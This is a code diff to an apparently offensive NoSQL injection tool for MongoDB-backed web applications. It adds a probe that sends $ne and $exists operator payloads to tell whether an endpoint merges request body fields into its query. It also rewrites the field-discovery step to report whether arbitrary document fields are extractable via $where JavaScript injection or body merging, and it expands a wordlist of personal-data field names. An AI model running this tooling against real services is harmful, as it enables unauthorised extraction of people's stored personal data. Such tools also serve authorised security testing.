@@ -635,6 +635,7 @@ _COMMON_FIELDS = [
     "phone", "address", "city", "country", "zip", "first_name", "last_name",
     "firstName", "lastName", "dob", "createdAt", "updatedAt", "status", "type",
     "trackingNum", "tracking", "data", "value", "note", "comment", "description",
+    "recipient", "sender", "owner", "fullname", "fullName", "account", "uid",
 ]
 
 
@@ -712,20 +713,58 @@ def discover_exists(ctx, method, base_url, vector, fields_literal, wordlist=None
     return found
 
 
+def _body_merges(ctx, method, base_url, vector, fields_literal):
+    # Does the app constrain the query by EXTRA body fields (find(req.body))?
+    # Returns True (merges -> arbitrary fields constrainable), False (strict-key),
+    # or None (no usable oracle).
+    def probe(overrides):
+        spec = {n: ("op", "$ne", _rand()) for n in fields_literal}
+        spec.update(overrides)
+        return _send(ctx, method, base_url, vector, spec)
+    try:
+        ref_match = probe({})
+        ref_no = probe({n: ("lit", _rand()) for n in fields_literal})
+        canary = probe({"nx_" + _rand(): ("ops", {"$exists": True})})
+    except requests.RequestException:
+        return None
+    if not _states_differ(ref_match, ref_no):
+        return None
+    # If requiring a bogus field still matches, the app ignored it -> strict-key.
+    return not _classify_true(canary, ref_match, ref_no)
+
+
 def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
-    print("\n[*] Field/column discovery...")
+    # Probe the injection's REACH and report a verdict: can arbitrary document
+    # fields be extracted, or only the query parameter's own values?
+    print("\n[*] Field/column discovery (probing the injection's reach)...")
+    params = ", ".join(fields_literal.keys())
     where = next((f["where"] for f in findings if f.get("where")), None)
-    found = []
+
     if where:
-        found = discover_where(ctx, method, base_url, vector, fields_literal, where)
-    if not found:
-        found = discover_exists(ctx, method, base_url, vector, fields_literal)
-    if found:
-        print("[+] Discovered %d field(s): %s" % (len(found), ", ".join(found)))
-    else:
-        print("[-] No fields discovered via injection (strict-key query / no $where).")
-        print("    On in-band endpoints the field labels are visible in --dump output.")
-    return found
+        keys = discover_where(ctx, method, base_url, vector, fields_literal, where)
+        print("[+] $where JavaScript injection: ARBITRARY fields are readable via this.<field>.")
+        if keys:
+            print("    Document keys: %s" % ", ".join(keys))
+        else:
+            print("    (key enumeration inconclusive; name fields with --extract / --extractMethod where)")
+        return keys
+
+    merges = _body_merges(ctx, method, base_url, vector, fields_literal)
+    if merges:
+        keys = discover_exists(ctx, method, base_url, vector, fields_literal)
+        print("[+] App queries by the request body: ARBITRARY fields are constrainable/extractable.")
+        if keys:
+            print("    Discovered fields: %s" % ", ".join(keys))
+        else:
+            print("    (no common field names matched the wordlist; try --extract <guessed-name>)")
+        return keys
+
+    # Strict-key verdict.
+    print("[-] Strict-key injection: the query constrains only [%s]." % params)
+    print("    -> ARBITRARY-field extraction is NOT possible here (no $where, no body merge).")
+    print("    -> Blind extraction is limited to the value(s) of: %s" % params)
+    print("    -> Any other field is reachable only if the app renders it -> use --dump.")
+    return []
 
 
 def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
